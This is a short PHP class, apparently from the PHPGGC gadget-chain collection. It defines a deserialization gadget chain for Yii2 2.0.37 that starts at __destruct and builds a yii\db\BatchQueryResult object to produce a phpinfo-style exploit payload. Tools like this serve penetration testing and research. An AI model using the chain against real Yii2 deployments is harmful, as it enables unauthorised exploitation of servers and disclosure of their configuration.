<?php

namespace GadgetChain\Yii2;

class INFO1 extends \PHPGGC\GadgetChain\PHPInfo
{
    public static $version = '2.0.37';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \yii\db\BatchQueryResult();
    }
}

